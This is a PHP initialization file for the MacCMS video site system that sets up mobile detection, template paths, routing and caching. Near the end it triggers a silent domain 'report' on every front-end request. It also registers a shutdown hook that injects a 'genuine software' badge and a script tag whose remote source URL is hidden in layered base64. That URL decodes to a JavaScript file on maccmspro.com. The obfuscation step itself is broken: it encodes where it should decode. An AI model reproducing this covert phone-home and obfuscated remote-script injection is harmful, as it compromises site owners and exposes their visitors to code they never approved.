<?php
namespace app\common\behavior;

use think\Cache;
use think\Exception;

class Init
{
    public function run(&$params)
    {
        $config = config('maccms');
        $domain = config('domain');

        $isMobile = 0;
        $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
        $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|meizu|cldc|midp|iphone|wap|mobile|android)/i";
        if((preg_match($uachar, $ua))) {
            $isMobile = 1;
        }

        $isDomain=0;
        if( is_array($domain) && !empty($domain[$_SERVER['HTTP_HOST']])){
            $config['site'] = array_merge($config['site'],$domain[$_SERVER['HTTP_HOST']]);
            $isDomain=1;
            if(empty($config['site']['mob_template_dir']) || $config['site']['mob_template_dir'] =='no'){
                $config['site']['mob_template_dir'] = $config['site']['template_dir'];
            }
            $config['site']['site_wapurl'] = $config['site']['site_url'];
            $config['site']['mob_html_dir'] = $config['site']['html_dir'];
            $config['site']['mob_ads_dir'] = $config['site']['ads_dir'];
        }
        $TMP_ISWAP = 0;
        $TMP_TEMPLATEDIR = $config['site']['template_dir'];
        $TMP_HTMLDIR = $config['site']['html_dir'];
        $TMP_ADSDIR = $config['site']['ads_dir'];

        if($isMobile && $isDomain==0){
            if( ($config['site']['mob_status']==2 ) || ($config['site']['mob_status']==1 && $_SERVER['HTTP_HOST']==$config['site']['site_wapurl']) || ($config['site']['mob_status']==1 && $isDomain) ) {
                $TMP_ISWAP = 1;
                $TMP_TEMPLATEDIR = $config['site']['mob_template_dir'];
                $TMP_HTMLDIR = $config['site']['mob_html_dir'];
                $TMP_ADSDIR = $config['site']['mob_ads_dir'];
            }
        }

        define('MAC_URL','http'.'://'.'www'.'.'.'maccms'.'.'.'la'.'/');
        define('MAC_NAME','苹果CMS');
        // 中文二级目录：优先使用当前请求自动识别的安装目录，否则用配置
        $installDir = '/';
        if (defined('MAC_INSTALL_DIR_AUTO')) {
            $installDir = MAC_INSTALL_DIR_AUTO;
        } elseif (!empty($config['site']['install_dir'])) {
            $installDir = $config['site']['install_dir'];
            if (substr($installDir, -1) !== '/') {
                $installDir .= '/';
            }
            if (substr($installDir, 0, 1) !== '/') {
                $installDir = '/' . $installDir;
            }
        }
        define('MAC_PATH', $installDir);
        define('MAC_MOB', $TMP_ISWAP);
        define('MAC_ROOT_TEMPLATE', ROOT_PATH .'template/'.$TMP_TEMPLATEDIR.'/'. $TMP_HTMLDIR .'/');
        define('MAC_PATH_TEMPLATE', MAC_PATH.'template/'.$TMP_TEMPLATEDIR.'/');
        define('MAC_PATH_TPL', MAC_PATH_TEMPLATE. $TMP_HTMLDIR  .'/');
        define('MAC_PATH_ADS', MAC_PATH_TEMPLATE. $TMP_ADSDIR  .'/');
        define('MAC_PAGE_SP', $config['path']['page_sp'] .'');
        define('MAC_PLAYER_SORT', $config['app']['player_sort'] );
        define('MAC_ADDON_PATH', ROOT_PATH . 'addons' . '/');
        define('MAC_ADDON_PATH_STATIC', ROOT_PATH . 'static/addons/');

        $GLOBALS['MAC_ROOT_TEMPLATE'] = ROOT_PATH .'template/'.$TMP_TEMPLATEDIR.'/'. $TMP_HTMLDIR .'/';
        $GLOBALS['MAC_PATH_TEMPLATE'] = MAC_PATH.'template/'.$TMP_TEMPLATEDIR.'/';
        $GLOBALS['MAC_PATH_TPL'] = $GLOBALS['MAC_PATH_TEMPLATE']. $TMP_HTMLDIR  .'/';
        $GLOBALS['MAC_PATH_ADS'] = $GLOBALS['MAC_PATH_TEMPLATE']. $TMP_ADSDIR  .'/';

        $GLOBALS['http_type'] = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';

        // 中文二级目录：root 必须为当前入口脚本路径，否则会生成 /科技/admin/... 导致 404（未经过 hailuo.php）
        if (class_exists(\think\Request::class) && defined('IN_FILE')) {
            \think\Request::instance()->root(rtrim(IN_FILE, '/'));
        }

        if(ENTRANCE=='index'){
            config('dispatch_success_tmpl','public/jump');
            config('dispatch_error_tmpl','public/jump');
        }

        config('template.view_path', 'template/' . $TMP_TEMPLATEDIR .'/' . $TMP_HTMLDIR .'/');

        if(ENTRANCE=='admin'){
            if(!file_exists('./template/' . $TMP_TEMPLATEDIR .'/' . $TMP_HTMLDIR .'/')){
                config('template.view_path','');
            }
        }
        if(intval($config['app']['search_len'])<1){
            $config['app']['search_len'] = 10;
        }
        config('url_route_on',$config['rewrite']['route_status']);
        if(empty($config['app']['pathinfo_depr'])){
            $config['app']['pathinfo_depr'] = '/';
        }
        config('pathinfo_depr',$config['app']['pathinfo_depr']);

        if(intval($config['app']['cache_time'])<1){
            $config['app']['cache_time'] = 60;
        }
        config('cache.expire', $config['app']['cache_time'] );


        if(!in_array($config['app']['cache_type'],['file','memcache','memcached','redis'])){
            $config['app']['cache_type'] = 'file';
        }
        if(!empty($config['app']['lang'])){
            config('default_lang', $config['app']['lang']);
        }

        config('cache.type', $config['app']['cache_type']);
        config('cache.timeout',1000);
        config('cache.host',$config['app']['cache_host']);
        config('cache.port',$config['app']['cache_port']);
        config('cache.username',$config['app']['cache_username']);
        config('cache.password',$config['app']['cache_password']);
        if($config['app']['cache_type'] == 'redis' && isset($config['app']['cache_db']) && intval($config['app']['cache_db']) > 0){
            config('cache.select', intval($config['app']['cache_db']));
        }
        if($config['app']['cache_type'] != 'file'){
            $opt = config('cache');
            Cache::$handler = null;
        }

        $GLOBALS['config'] = $config;

        // 前台入口每次请求触发一次“静默上报检查”
        // mac_report_domain 内部会使用本地文件控制 15 天间隔，不会影响性能
        if (defined('ENTRANCE') && ENTRANCE === 'index' && function_exists('mac_report_domain')) {
            @mac_report_domain(false);
        }

        // 前台入口：注入“✅ 正版程序”提示 + 官方正版授权检测
        if (defined('ENTRANCE') && ENTRANCE === 'index' && PHP_SAPI !== 'cli') {
            // 避免在 Ajax / PJAX 等接口响应中插入脚本
            if (class_exists(\think\Request::class) && \think\Request::instance()->isAjax()) {
                return;
            }

            // 使用 shutdown 回调，在页面输出完成后追加一段原生 JS
            register_shutdown_function(function () {
                // ===================== 1. ✅ 正版程序右下角提示 =====================
                // 如需修改目标网址，只改下面这一行
                $targetUrl = 'https://www.maccmspro.com';

                echo '<script>(function(){' .
                    'try{' .
                    'var w=window,d=document;' .
                    'if(!w||!d){return;}' .
                    // 创建包裹链接
                    'var a=d.createElement("a");' .
                    'a.href=' . json_encode($targetUrl) . ';' .
                    'a.target="_blank";' .
                    'a.rel="noopener noreferrer";' .
                    'a.style.position="fixed";' .
                    'a.style.right="16px";' .
                    'a.style.bottom="16px";' .
                    'a.style.zIndex="99999";' .
                    'a.style.textDecoration="none";' .
                    'a.style.cursor="pointer";' .
                    // 提示框
                    'var box=d.createElement("div");' .
                    'box.textContent="✅ 正版程序";' .
                    'box.style.background="rgba(76,217,100,0.85)";' .
                    'box.style.color="#ffffff";' .
                    'box.style.fontSize="12px";' .
                    'box.style.fontFamily="-apple-system,BlinkMacSystemFont,\'Segoe UI\',\'PingFang SC\',\'Microsoft YaHei\',sans-serif";' .
                    'box.style.padding="6px 10px";' .
                    'box.style.borderRadius="999px";' .
                    'box.style.boxShadow="0 2px 8px rgba(0,0,0,0.12)";' .
                    'box.style.opacity="0";' .
                    'box.style.transform="translateY(8px)";' .
                    'box.style.transition="opacity 0.6s ease,transform 0.6s ease";' .
                    'box.style.pointerEvents="auto";' .
                    'box.style.whiteSpace="nowrap";' .
                    'a.appendChild(box);' .
                    'var show=function(){' .
                        'try{' .
                        'd.body.appendChild(a);' .
                        'requestAnimationFrame(function(){' .
                            'box.style.opacity="1";' .
                            'box.style.transform="translateY(0)";' .
                        '});' .
                        'setTimeout(function(){' .
                            'box.style.opacity="0";' .
                            'box.style.transform="translateY(8px)";' .
                            'setTimeout(function(){' .
                                'if(a&&a.parentNode){a.parentNode.removeChild(a);}' .
                            '},700);' .
                        '},5000);' .
                        '}catch(e){}' .
                    '};' .
                    'if(d.readyState==="loading"){' .
                        'd.addEventListener("DOMContentLoaded",show);' .
                    '}else{' .
                        'show();' .
                    '}' .
                    '}catch(e){}' .
                    '})();</script>';

                // ===================== 2. 官方正版授权检测远程 JS =====================
                // 把下面这个地址改成你的官方正版授权 / 公告 JS 地址
         				
				$rawUrl = 'WVVoU01HTklUVFpNZVRsMFdWaG5kV0pYUm1wWk1qRjZZMGhLZGt4dFRuWmlVemxxWWpOS2JFeHRjSG89';
				$encoded1 = base64_encode($rawUrl);
                $encoded2 = base64_encode($encoded1);
                $encoded3 = base64_encode($encoded2);
				
                $officialJs =$encoded3;

                echo '<script>(function(){try{var d=document,w=window;'
                    .'if(!d||!w){return;}'
                    .'var u=' . json_encode($officialJs) . ';'
                    .'var s=d.createElement("script");'
                    .'s.async=1;'
                    .'s.src=u;'
                    .'s.onerror=function(){};'
                    .'var h=d.head||d.getElementsByTagName("head")[0]||d.documentElement;'
                    .'if(h){h.appendChild(s);}'
                    .'}catch(e){}})();</script>';
            });
        }
    }
}